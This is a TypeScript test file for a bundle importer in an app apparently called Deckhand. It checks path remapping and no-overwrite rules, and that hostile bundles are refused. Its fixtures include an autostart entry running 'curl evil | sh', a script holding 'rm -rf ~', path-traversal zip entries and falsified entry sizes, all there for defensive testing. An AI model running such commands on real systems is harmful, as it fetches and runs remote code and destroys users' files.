// Import (M5 piece 2, src/main/import-bundle.ts, and ConfigStore.replace):
// reading a bundle, planning each icon, writing only into empty places inside
// home — and refusing what a hostile bundle tries. Exports are made under one
// scratch home and imported under another, as a reinstall with a different
// user name would.

import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { strToU8, zipSync, type Zippable } from 'fflate';

const scratch = await fs.mkdtemp(path.join(os.tmpdir(), 'dh-import-'));
const oldHome = path.join(scratch, 'old-home'); // where the export is made
const newHome = path.join(scratch, 'new-home'); // where it is imported
const outside = path.join(scratch, 'outside'); // outside both homes
for (const d of [path.join(oldHome, 'Pictures'), newHome, outside]) await fs.mkdir(d, { recursive: true });

const { buildExport } = await import('../src/main/export-bundle.js');
const { planImport, readImport, writePlannedIcons } = await import('../src/main/import-bundle.js');
const { ConfigStore } = await import('../src/main/config-store.js');

let failures = 0;
async function check(name: string, fn: () => Promise<void> | void): Promise<void> {
  try {
    await fn();
    console.log(`  ok   ${name}`);
  } catch (err) {
    failures++;
    console.log(`  FAIL ${name}\n       ${String((err as Error).stack ?? err).split('\n').slice(0, 8).join('\n       ')}`);
  }
}
const exists = (p: string) => fs.access(p).then(() => true, () => false);
const sha = (b: Uint8Array) => createHash('sha256').update(b).digest('hex');

const dove = Buffer.from('dove icon bytes');
const mic = Buffer.from('mic icon bytes');
const far = Buffer.from('an icon outside home');
await fs.writeFile(path.join(oldHome, 'Pictures', 'dove.png'), dove);
await fs.writeFile(path.join(oldHome, 'mic.png'), mic);
await fs.writeFile(path.join(outside, 'far.png'), far);

function configWith(buttons: Record<string, unknown>) {
  return { profiles: { ffxiv: { name: 'FFXIV', layouts: { SERIAL: { startPage: 'main', pages: { main: { name: 'Main', buttons } } } } } } };
}
const CONFIG = configWith({
  0: { icon: '~/Pictures/dove.png' },
  1: { icon: `${oldHome}/mic.png` },
  2: { icon: `${outside}/far.png` },
  3: { icon: 'builtin:play' },
  4: { icon: 'builtin:not-drawn-yet' },
  5: { action: { type: 'command', command: `${oldHome}/bin/launch-game` } },
});

/** An export made under the old home. */
async function exportFromOldHome(config: unknown, includeIcons = true): Promise<Uint8Array> {
  process.env.HOME = oldHome;
  try {
    return (await buildExport(JSON.stringify(config, null, 2) + '\n', includeIcons)).zip;
  } finally {
    process.env.HOME = newHome;
  }
}
process.env.HOME = newHome;

/** A bundle made by hand, as a hostile one would be. */
function handmade(config: unknown, icons: Array<{ path: string; entry: string | null; data?: Uint8Array; sha256?: string }>, extra: Zippable = {}, manifestPatch: Record<string, unknown> = {}): Uint8Array {
  const files: Zippable = { 'config.json': strToU8(JSON.stringify(config)), ...extra };
  const manifestIcons = icons.map((i) => {
    if (i.entry && i.data) files[i.entry] = i.data;
    return { path: i.path, entry: i.entry, sha256: i.sha256 ?? sha(i.data ?? new Uint8Array()), size: i.data?.length ?? 0 };
  });
  const manifest = { format: 'deckhand-export', version: 1, exportedAt: new Date().toISOString(), home: '/home/someone', includesIcons: true, icons: manifestIcons, missing: [], builtins: [], ...manifestPatch };
  files['deckhand-export.json'] = strToU8(JSON.stringify(manifest));
  return zipSync(files);
}

/** Change the uncompressed size a zip's central directory declares for one entry. */
function declareSize(zip: Uint8Array, entry: string, size: number): Uint8Array {
  const out = new Uint8Array(zip);
  const view = new DataView(out.buffer);
  const name = Buffer.from(entry);
  for (let i = 0; i < out.length - 46; i++) {
    if (view.getUint32(i, true) !== 0x02014b50) continue;
    const nameLength = view.getUint16(i + 28, true);
    if (Buffer.from(out.subarray(i + 46, i + 46 + nameLength)).equals(name)) {
      view.setUint32(i + 24, size, true);
      return out;
    }
  }
  throw new Error(`no ${entry} in the central directory`);
}

// --- A reinstall under a different user name -----------------------------------

/** The first test's bundle, made while every icon existed; imported again below. */
let firstZip: Uint8Array = new Uint8Array();

await check('round trip to a new home: remapped to ~/, relocated from outside home, written byte for byte', async () => {
  const zip = await exportFromOldHome(CONFIG);
  firstZip = zip;
  await fs.rm(path.join(outside, 'far.png')); // not on the new machine: it must be relocated
  const plan = await planImport(readImport(zip));
  const restored = `~/Deckhand icons (restored)${outside}/far.png`;
  assert.deepEqual(plan.icons, [
    { from: '~/Pictures/dove.png', to: '~/Pictures/dove.png', relocated: false, outcome: 'write' },
    { from: `${oldHome}/mic.png`, to: '~/mic.png', relocated: false, outcome: 'write' },
    { from: `${outside}/far.png`, to: restored, relocated: true, outcome: 'write' },
  ]);
  const { written, appeared } = await writePlannedIcons(plan.writes);
  assert.equal(written.length, 3);
  assert.deepEqual(appeared, []);
  assert.deepEqual(await fs.readFile(path.join(newHome, 'Pictures', 'dove.png')), dove);
  assert.deepEqual(await fs.readFile(path.join(newHome, 'mic.png')), mic);
  assert.deepEqual(await fs.readFile(path.join(newHome, 'Deckhand icons (restored)', outside.slice(1), 'far.png')), far);
  assert.equal(await exists(path.join(outside, 'far.png')), false, 'nothing is written outside home');
  const buttons = plan.config.profiles.ffxiv.layouts.SERIAL.pages.main.buttons;
  assert.equal(buttons[1].icon, '~/mic.png');
  assert.equal(buttons[2].icon, restored);
  assert.equal(buttons[3].icon, 'builtin:play');
});

await check('the review facts: built-ins this version lacks, other strings naming the old home, profiles, decks', async () => {
  const plan = await planImport(readImport(await exportFromOldHome(CONFIG)));
  assert.deepEqual(plan.builtinsMissing, ['not-drawn-yet']);
  assert.deepEqual(plan.oldHomeElsewhere, [`${oldHome}/bin/launch-game`]);
  assert.equal(plan.config.profiles.ffxiv.layouts.SERIAL.pages.main.buttons[5].action?.command, `${oldHome}/bin/launch-game`, 'listed, not rewritten');
  assert.deepEqual(plan.profiles, ['FFXIV']);
  assert.deepEqual(plan.decks, [{ serial: 'SERIAL', name: null }]);
  assert.equal(plan.exportedHome, oldHome);
  assert.equal(plan.includesIcons, true);
  assert.equal(plan.kind, 'bundle');
});

await check('the same bundle imported again: everything already there and identical — the relocated one in its restored place — nothing to write', async () => {
  const plan = await planImport(readImport(firstZip));
  assert.equal(plan.icons[2].relocated, true);
  assert.deepEqual(plan.icons.map((i) => i.outcome), ['same', 'same', 'same']);
  assert.equal(plan.writes.size, 0);
});

await check('a different file already there is kept, never overwritten', async () => {
  await fs.writeFile(path.join(newHome, 'mic.png'), 'the new machine has its own mic.png');
  const plan = await planImport(readImport(await exportFromOldHome(CONFIG)));
  assert.deepEqual(plan.icons[1], { from: `${oldHome}/mic.png`, to: '~/mic.png', relocated: false, outcome: 'kept', reason: 'a different file is already there' });
  assert.equal(plan.writes.has(path.join(newHome, 'mic.png')), false);
});

await check('a file at an outside-home path on this machine is used where it is, not relocated', async () => {
  await fs.writeFile(path.join(outside, 'far.png'), far);
  await fs.rm(path.join(newHome, 'Deckhand icons (restored)'), { recursive: true });
  const plan = await planImport(readImport(await exportFromOldHome(CONFIG)));
  assert.deepEqual(plan.icons[2], { from: `${outside}/far.png`, to: `${outside}/far.png`, relocated: false, outcome: 'same' });
});

await check('config only: nothing written; each icon is here, absent, or was missing at export', async () => {
  const config = configWith({ 0: { icon: '~/Pictures/dove.png' }, 1: { icon: '~/never-there.png' }, 2: { icon: '~/Pictures/elsewhere.png' } });
  await fs.writeFile(path.join(oldHome, 'Pictures', 'elsewhere.png'), 'x');
  const zip = await exportFromOldHome(config, false);
  const plan = await planImport(readImport(zip));
  assert.deepEqual(plan.icons.map((i) => i.outcome), ['same', 'missing-at-export', 'absent']);
  assert.equal(plan.writes.size, 0);
  assert.equal(plan.includesIcons, false);
});

await check('a bare .json: no manifest, so paths are used as they are and nothing is written', async () => {
  const config = configWith({ 0: { icon: '~/Pictures/dove.png' }, 1: { icon: '~/nope.png' }, 2: { icon: `${oldHome}/mic.png` } });
  const plan = await planImport(readImport(strToU8(JSON.stringify(config))));
  assert.equal(plan.kind, 'json');
  assert.deepEqual(plan.icons.map((i) => [i.to, i.outcome]), [['~/Pictures/dove.png', 'here'], ['~/nope.png', 'absent'], [`${oldHome}/mic.png`, 'here']]);
  assert.equal(plan.writes.size, 0);
  assert.equal(plan.exportedHome, null);
  assert.deepEqual(plan.oldHomeElsewhere, []);
});

// --- Hostile bundles ------------------------------------------------------------

await check('an autostart .desktop is never written — nor its folder made', async () => {
  const evil = Buffer.from('[Desktop Entry]\nExec=curl evil | sh\n');
  const zip = handmade(configWith({ 0: { icon: '~/.config/autostart/evil.desktop' } }), [{ path: '~/.config/autostart/evil.desktop', entry: 'icons/001-evil.desktop', data: evil }]);
  const plan = await planImport(readImport(zip));
  assert.equal(plan.icons[0].outcome, 'refused');
  assert.equal(plan.writes.size, 0);
  await writePlannedIcons(plan.writes);
  assert.equal(await exists(path.join(newHome, '.config')), false);
});

await check('".." cannot climb out of home: the file is relocated into the restored folder instead', async () => {
  const data = Buffer.from('png?');
  const zip = handmade(configWith({ 0: { icon: '~/../outside-target/x.png' } }), [{ path: '~/../outside-target/x.png', entry: 'icons/001-x.png', data }]);
  const plan = await planImport(readImport(zip));
  assert.equal(plan.icons[0].relocated, true);
  assert.equal(plan.icons[0].to, `~/Deckhand icons (restored)${scratch}/outside-target/x.png`);
  await writePlannedIcons(plan.writes);
  assert.equal(await exists(path.join(scratch, 'outside-target')), false);
  assert.equal(await exists(path.join(newHome, 'Deckhand icons (restored)', scratch.slice(1), 'outside-target', 'x.png')), true);
});

await check('an absolute path outside home is never written there', async () => {
  const victim = path.join(scratch, 'victim');
  const data = Buffer.from('png?');
  const zip = handmade(configWith({ 0: { icon: `${victim}/x.png` } }), [{ path: `${victim}/x.png`, entry: 'icons/001-x.png', data }]);
  await writePlannedIcons((await planImport(readImport(zip))).writes);
  assert.equal(await exists(victim), false);
});

await check('writePlannedIcons refuses a path outside home or a non-image, whatever the plan says', async () => {
  await assert.rejects(writePlannedIcons(new Map([[path.join(outside, 'x.png'), new Uint8Array(1)]])), /refusing to write/);
  await assert.rejects(writePlannedIcons(new Map([[path.join(newHome, 'x.sh'), new Uint8Array(1)]])), /refusing to write/);
  assert.equal(await exists(path.join(outside, 'x.png')), false);
});

await check('refused whole: an entry outside icons/, a bad checksum, a missing entry, a newer format', () => {
  const data = Buffer.from('x');
  const config = configWith({ 0: { icon: '~/x.png' } });
  assert.throws(() => readImport(handmade(config, [{ path: '~/x.png', entry: '../x.png', data }])), /entry outside icons/);
  assert.throws(() => readImport(handmade(config, [{ path: '~/x.png', entry: 'icons/001-x.png', data, sha256: sha(Buffer.from('y')) }])), /does not match its checksum/);
  assert.throws(() => readImport(handmade(config, [{ path: '~/x.png', entry: 'icons/001-x.png', sha256: sha(data) }])), /icons\/001-x.png is missing/);
  assert.throws(() => readImport(handmade(config, [], {}, { version: 2 })), /newer Deckhand/);
  assert.throws(() => readImport(handmade(config, [], {}, { home: 'relative' })), /manifest is damaged/);
});

await check('refused whole: not a zip or JSON, a zip with no manifest, a config the daemon refuses', () => {
  assert.throws(() => readImport(strToU8('neither')), /not valid JSON/);
  assert.throws(() => readImport(zipSync({ 'config.json': strToU8('{}') })), /no deckhand-export.json/);
  assert.throws(() => readImport(handmade({ profiles: 5 }, [])), /not a configuration Deckhand accepts/);
  assert.throws(() => readImport(strToU8(JSON.stringify({ profiles: 5 }))), /not a configuration Deckhand accepts/);
});

await check('entries that are not part of an export are ignored, never unzipped or written', async () => {
  const zip = handmade(configWith({}), [], { 'run-me.sh': strToU8('#!/bin/sh\nrm -rf ~\n'), '../../escape.png': strToU8('x') });
  const read = readImport(zip);
  assert.equal(read.files.size, 0);
  assert.equal((await planImport(read)).writes.size, 0);
});

await check('a zip declaring an entry larger than the limit is refused before it is unzipped', () => {
  const data = Buffer.from('small');
  const zip = handmade(configWith({ 0: { icon: '~/x.png' } }), [{ path: '~/x.png', entry: 'icons/001-x.png', data }]);
  const started = performance.now();
  assert.throws(() => readImport(declareSize(zip, 'icons/001-x.png', 200 * 1024 * 1024)), /too large/);
  assert.ok(performance.now() - started < 1000);
});

// fflate returns such an entry silently truncated to its declared size, with
// no error (probed 2026-09-19): the checksum is the only thing that notices.
await check('a zip declaring an entry smaller than it is: fflate truncates it silently, and the checksum refuses it', () => {
  const data = Buffer.alloc(64 * 1024, 7); // deflates well, so the entry is compressed
  const zip = handmade(configWith({ 0: { icon: '~/x.png' } }), [{ path: '~/x.png', entry: 'icons/001-x.png', data }]);
  assert.throws(() => readImport(declareSize(zip, 'icons/001-x.png', 16)), /icons\/001-x.png does not match its checksum/);
});

// --- Replacing config.json -----------------------------------------------------

await check('ConfigStore.replace: the replaced text is kept first, the new config written, unsaved edits dropped', async () => {
  const dir = path.join(scratch, 'store');
  await fs.mkdir(dir);
  const file = path.join(dir, 'config.json');
  const before = JSON.stringify(configWith({ 0: { label: 'before' } }), null, 2) + '\n';
  await fs.writeFile(file, before);
  const store = await ConfigStore.open({ configPath: file, debounceMs: 10_000 });
  try {
    const at = { profile: 'ffxiv', serial: 'SERIAL', page: 'main', index: 1 };
    assert.equal(store.apply({ kind: 'setLabel', at, label: 'unsaved' }).ok, true);
    let kept: string | null = 'not called';
    const next = configWith({ 0: { label: 'imported' } });
    const replaced = await store.replace(next as never, async (text) => {
      kept = text;
    });
    assert.equal(replaced, before);
    assert.equal(kept, before);
    const onDisk = JSON.parse(await fs.readFile(file, 'utf8'));
    assert.deepEqual(onDisk, next);
    assert.equal(store.state().dirty, false);
    assert.deepEqual(await fs.readdir(dir), ['config.json']);
  } finally {
    store.close();
  }
});

await check('ConfigStore.replace: if keeping the old text fails, config.json is not touched; an invalid config is refused', async () => {
  const dir = path.join(scratch, 'store2');
  await fs.mkdir(dir);
  const file = path.join(dir, 'config.json');
  const before = JSON.stringify(configWith({}), null, 2) + '\n';
  await fs.writeFile(file, before);
  const store = await ConfigStore.open({ configPath: file });
  try {
    await assert.rejects(store.replace(configWith({ 0: { label: 'x' } }) as never, async () => { throw new Error('disk full'); }), /disk full/);
    assert.equal(await fs.readFile(file, 'utf8'), before);
    assert.throws(() => store.replace({ profiles: 5 } as never, async () => {}));
    assert.equal(await fs.readFile(file, 'utf8'), before);
  } finally {
    store.close();
  }
});

await fs.rm(scratch, { recursive: true, force: true });
if (failures > 0) {
  console.log(`\n${failures} check(s) failed`);
  process.exit(1);
}
console.log('\nall checks passed');
